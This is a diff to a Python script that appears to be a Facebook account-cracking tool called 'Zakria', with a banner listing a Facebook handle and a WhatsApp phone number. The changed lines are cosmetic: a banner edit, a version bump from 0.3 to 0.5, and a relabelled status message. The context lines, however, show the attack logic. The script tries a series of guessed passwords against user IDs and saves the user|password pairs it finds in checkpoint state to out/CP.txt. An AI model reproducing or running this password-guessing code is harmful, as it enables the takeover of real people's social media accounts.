@@ -50,6 +50,7 @@ def jalan(z):
 logo = """
 \033[1;91m       ♦♦♦———————————————————————————————♦♦♦
 
+
 \033[1;96m /$$$$$$$$            /$$                 /$$          
  \033[1;96m|_____ $$           | $$                |__/          
   \033[1;96m    /$$/  /$$$$$$ | $$   /$$  /$$$$$$  /$$  /$$$$$$ 
@@ -58,12 +59,12 @@ logo = """
 \033[1;96m  /$$/     /$$__  $$| $$_  $$ | $$      | $$ /$$__  $$  
 \033[1;96m\/$$$$$$$$|  $$$$$$$| $$ \  $$| $$      | $$|  $$$$$$$
 \033[1;96m|________/ \_______/|__/  \__/|__/      |__/ \_______/
-  \033[1;97mAuthor\033[1;97m    :❥•❥•❥•❥• \033[1;97mTermuxMaster
-\033[1;97mTermuxMaster\033[1;97m:❥•❥•❥•❥• \033[1;97▒▓██████████████]99.9
+
+
 \033[1;93mFacebook\033[1;93m  :❥•❥•❥•❥• \033[1;93mMuhammadzakria
 \033[1;93mWhatsapp\033[1;93m  :❥•❥•❥•❥• \033[1;93m+1(786)7663709
                                
-\033[1;96m                    Zakria Updated 0.3                   
+\033[1;96m                    Zakria Updated 0.5            
 \033[1;91m       ♦♦♦———————————————————————————————♦♦♦
 """
 def tik():
@@ -345,7 +346,7 @@ def pilih_super():
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass1 + ' 👽 ' + b['name']
+					print '\x1b[1;36;40m[After1Day] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass1 + ' 👽 ' + b['name']
 					cek = open("out/CP.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
@@ -373,7 +374,7 @@ def pilih_super():
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass3 + ' 👽 ' + b['name']
+									print '\x1b[1;36;40m[After1Day] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass3 + ' 👽 ' + b['name']
 									cek = open("out/CP.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
@@ -387,7 +388,7 @@ def pilih_super():
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass4 + ' 👽 ' + b['name']
+											print '\x1b[1;36;40m[After1Day] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass4 + ' 👽 ' + b['name']
 											cek = open("out/CP.txt", "a")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
@@ -401,7 +402,7 @@ def pilih_super():
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
+													print '\x1b[1;36;40m[After1Day] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
 													cek = open("out/CP.txt", "a")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
@@ -415,7 +416,7 @@ def pilih_super():
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
+															print '\x1b[1;36;40m[After1Day] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
 															cek = open("out/CP.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
@@ -429,7 +430,7 @@ def pilih_super():
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
+																	print '\x1b[1;36;40m[After1Day] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
 																	cek = open("out/CP.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
